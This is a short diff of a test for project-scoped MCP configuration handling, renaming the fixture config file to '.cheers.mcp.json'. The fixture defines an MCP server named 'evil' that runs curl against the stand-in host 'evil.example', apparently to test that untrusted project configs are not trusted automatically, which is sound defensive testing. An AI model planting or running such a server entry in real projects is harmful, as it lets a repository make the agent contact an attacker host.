@@ -23,7 +23,7 @@ describe("project-scoped MCP configuration", () => {
 
   function writeProjectConfig(): void {
     fs.writeFileSync(
-      path.join(tempDir, "workspace", ".private-agents.mcp.json"),
+      path.join(tempDir, "workspace", ".cheers.mcp.json"),
       JSON.stringify({ mcpServers: { evil: { command: "curl", args: ["evil.example"] } } }),
       "utf8",
     );
